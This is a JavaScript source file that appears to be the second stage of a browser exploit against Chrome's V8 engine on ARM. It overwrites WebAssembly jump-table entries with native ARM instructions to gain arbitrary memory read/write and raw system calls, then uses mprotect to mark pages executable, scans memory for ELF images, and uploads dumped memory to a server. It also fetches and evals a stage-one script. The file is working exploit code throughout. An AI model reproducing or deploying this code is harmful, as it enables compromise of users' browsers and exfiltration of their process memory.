const wasmstage2Native = [
  [0xe5900000, 0xe12fff1e],
  [0xe5802000, 0xe12fff1e],
  [0xe5d00000, 0xe12fff1e],
  [0xe5c02000, 0xe12fff1e],
  [0xe92d00f0, 0xe89000ff, 0xef000000, 0xe8bd00f0, 0xe12fff1e],
  [0xe1a0000e, 0xe12fff1e],
];

const wasmstage2WasmBytes = [
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0f, 0x03, 0x60, 0x01, 0x7f, 0x01, 0x7f,
  0x60, 0x02, 0x7f, 0x7f, 0x00, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x07, 0x06, 0x00, 0x01, 0x00, 0x01,
  0x00, 0x02, 0x04, 0x05, 0x01, 0x70, 0x01, 0x01, 0x01, 0x05, 0x03, 0x01, 0x00, 0x00, 0x06, 0x14,
  0x03, 0x7f, 0x00, 0x41, 0x08, 0x0b, 0x7f, 0x01, 0x41, 0x88, 0x80, 0x02, 0x0b, 0x7f, 0x00, 0x41,
  0x88, 0x80, 0x02, 0x0b, 0x07, 0x40, 0x07, 0x06, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x00, 0x00,
  0x07, 0x77, 0x72, 0x69, 0x74, 0x65, 0x33, 0x32, 0x00, 0x01, 0x05, 0x72, 0x65, 0x61, 0x64, 0x38,
  0x00, 0x02, 0x06, 0x77, 0x72, 0x69, 0x74, 0x65, 0x38, 0x00, 0x03, 0x07, 0x73, 0x79, 0x73, 0x63,
  0x61, 0x6c, 0x6c, 0x00, 0x04, 0x05, 0x67, 0x65, 0x74, 0x4c, 0x52, 0x00, 0x05, 0x06, 0x6d, 0x65,
  0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x09, 0x06, 0x01, 0x00, 0x41, 0x01, 0x0b, 0x00, 0x0a, 0xe3,
  0x02, 0x06, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1,
  0x00, 0x21, 0x01, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02,
  0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc4, 0x82,
  0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x41, 0x00, 0x0f, 0x0b, 0x38, 0x01,
  0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42,
  0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc3, 0x82, 0x85,
  0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8,
  0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x0b, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a,
  0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x01, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0,
  0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00,
  0x21, 0x03, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x41,
  0x00, 0x0f, 0x0b, 0x38, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0,
  0xc1, 0x00, 0x21, 0x02, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21,
  0x03, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42, 0xc4,
  0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x0b, 0x3b, 0x01, 0x04, 0x7e,
  0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x01, 0x42, 0xc2, 0x82,
  0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94,
  0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0,
  0xc1, 0x00, 0x21, 0x04, 0x41, 0x00, 0x0f, 0x0b, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85,
  0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x00, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8,
  0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x01, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1,
  0x00, 0x21, 0x02, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03,
  0x41, 0x00, 0x0f, 0x0b,
];

function log(a) {
  console.log(a);
  document.getElementById("log").innerText += a + "\n";
}

function getArrayBufferBufferAddress(buffer, arbRW) {
  const backing_store_offset = 0x18;
  const arrayBufferAddr = Number(arbRW.addrof(buffer)) & 0xfffffffe;
  return arbRW.read32(arrayBufferAddr + backing_store_offset);
}

function accessibleMemory(address, arbRW) {
  const NR_madvise = 0xdc;
  const myPage = address & 0xfffff000;
  const MADV_NORMAL = 0;
  log("accessibleMemory: " + (myPage >>> 0).toString(16));
  return arbRW.syscall(NR_madvise, myPage, 1, MADV_NORMAL) === 0;
}

function makeAccessible(address, arbRW) {
  const NR_mprotect = 0x7d;
  const PROT_READ = 1;
  const PROT_WRITE = 2;
  const PROT_EXEC = 4;
  return arbRW.syscall(NR_mprotect, address, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) === 0;
}

function getChromeExecutableBase(wasmLR, arbRW) {
  const pageMask = 0xfff;
  const notPageMask = 0xfffff000;
  const startPage = wasmLR & notPageMask;
  const endPage = startPage - 0x8000000;
  for (let i = startPage; i >= endPage; i -= 0x1000) {
    /*if (!accessibleMemory(i, arbRW)) {
      continue;
    }
    */
    if (!makeAccessible(i, arbRW)) {
      log("failed to make accessible: " + (i >>> 0).toString(16));
      continue;
    }
    const d = arbRW.read32(i);
    if (d === 0x464c457f) {
      // .ELF
      return i;
    }
  }
  return 0;
}

async function dumpMemory(dumpBase, arbRW, prefix, length) {
  log("dump memory?");
  const buf = new Uint32Array(0x1000 / 4);
  // 128m.
  const lengthToDump = length || 128 * 1024 * 1024;
  let awaits = [];
  for (let offset = 0; offset < lengthToDump; offset += 0x1000) {
    const addr = dumpBase + offset;
    if (!makeAccessible(addr, arbRW)) {
      log("failed to make accessible");
      break;
    }
    for (let i = 0; i < 0x1000; i += 4) {
      buf[i >> 2] = arbRW.read32(addr + i);
    }
    const prom = fetch(
      "/upload/dump_" + (prefix || "") + offset.toString(16).padStart(8, "0") + ".bin",
      { method: "PUT", body: buf },
    );
    awaits.push(prom);
    if (awaits.length >= 16) {
      await Promise.all(awaits);
      awaits = [];
    }
  }
}

function doWasm() {
  window.addEventListener("error", (e) => {
    log(e.error.toString());
  });
  const module = new WebAssembly.Module(new Uint8Array(wasmstage2WasmBytes));
  const instance = new WebAssembly.Instance(module);

  instance.exports.read32(0);
  instance.exports.write32(0);
  instance.exports.read8(0);
  instance.exports.write8(0);
  instance.exports.syscall(0);
  instance.exports.getLR();

  const jump_table_start_offset = 0x3cn;
  const instanceAddress = addrof(instance);
  const jumpTableAddress = Number(
    v8h_read64(instanceAddress + jump_table_start_offset) & 0xffffffffn,
  );
  console.log(jumpTableAddress.toString(16));
  for (let i = 0; i < 2; i++) {
    const targetAddress = v8h_read64(BigInt(jumpTableAddress + i * 12 + 8) + 1n) & 0xffffffffn;
    log(targetAddress.toString(16));
    const codeParts = wasmstage2Native[i];
    wasm_write(BigInt(targetAddress) + 1n, BigInt(codeParts[0]) | (BigInt(codeParts[1]) << 32n));
  }
  for (let i = 2; i < wasmstage2Native.length; i++) {
    const targetAddress = instance.exports.read32(jumpTableAddress + i * 12 + 8);
    const codeParts = wasmstage2Native[i];
    log(targetAddress.toString(16));
    for (let j = 0; j < codeParts.length; j++) {
      instance.exports.write32(targetAddress + j * 4, codeParts[j]);
    }
  }
  /*
  for (let i = 0; i < wasmstage2Native.length; i++) {
    const targetAddress = instance.exports.read32(jumpTableAddress + i * 12 + 8);
    const codeParts = wasmstage2Native[i];
    for (let j = 0; j < codeParts.length; j++) {
	    log((targetAddress + j*4).toString(16) + " : " + (instance.exports.read32(targetAddress + j*4) >>> 0).toString(16));
    }
  }*/
  log("ok");
  const lrResult = instance.exports.getLR() >>> 0;
  log("lrresult: " + lrResult.toString(16));
  const tempBuffer = new ArrayBuffer(0x1000);
  const tempBufferUint32View = new Uint32Array(tempBuffer);
  const tempBufferUint8View = new Uint8Array(tempBuffer);
  const tempBufferAddress = getArrayBufferBufferAddress(tempBuffer, {
    addrof: addrof,
    read32: instance.exports.read32,
  });
  log("tempBufferAddress: " + tempBufferAddress.toString(16));
  function syscall(nr, ...args) {
    for (let i = 0; i < 7; i++) {
      tempBufferUint32View[i] = args[i] || 0;
    }
    tempBufferUint32View[7] = nr;
    return instance.exports.syscall(tempBufferAddress);
  }
  const arbRW = { addrof, read32: instance.exports.read32, syscall };
  //const chromeBase = getChromeExecutableBase(lrResult, arbRW);
  //log("chromeBase: " + chromeBase.toString(16));
  //dumpMemory(chromeBase, arbRW);
  /*
	setTimeout(() =>{
        const NR_uname = 0x7a;
        log(arbRW.syscall(NR_uname, tempBufferAddress + 0x100));
        const unameout = new TextDecoder().decode(tempBufferUint8View.subarray(0x100, 0x280)).replaceAll("\u0000", "");
        log(unameout);
	}, 5000);
*/
  setTimeout(() => {
    /*
        const chromeBase = getChromeExecutableBase(lrResult, arbRW);
	log("chromeBase: " + (chromeBase >>> 0).toString(16));
	setTimeout(() => dumpMemory(chromeBase, arbRW), 1000);*/
    let last = false;
    let startAddress = 0;
    for (let i = 0; i <= 0xfffff000; i += 0x1000) {
      const newPerm = makeAccessible(i, arbRW);
      if (newPerm !== last) {
        log("mapping start/end: " + (i >>> 0).toString(16) + ":" + newPerm);
        if (newPerm && arbRW.read32(i) === 0x464c457f) {
          log("start of ELF");
        }
        if (newPerm) {
          startAddress = i;
        }
        if (!newPerm) {
          dumpMemory(startAddress, arbRW, startAddress.toString(16) + "-", i - startAddress);
          return;
        }
      }
      last = newPerm;
    }
  }, 2000);
  return instance;
}
function runIt() {
  if (!globalThis.stage1Failed) {
    try {
      const instance = doWasm();
    } catch (e) {
      log(e.toString());
    }
  } else {
    setTimeout(() => location.reload(), 1000);
  }
}
async function reRunIt() {
  const response = await fetch("/bnovkebin-0517.js");
  const text = await response.text();
  for (let i = 0; i < 4; i++) {
    globalThis.stage1Failed = false;
    eval(text);
    if (!globalThis.stage1Failed) {
      try {
        const instance = doWasm();
      } catch (e) {
        log(e.toString());
      }
    }
    return;
  }
}
runIt();
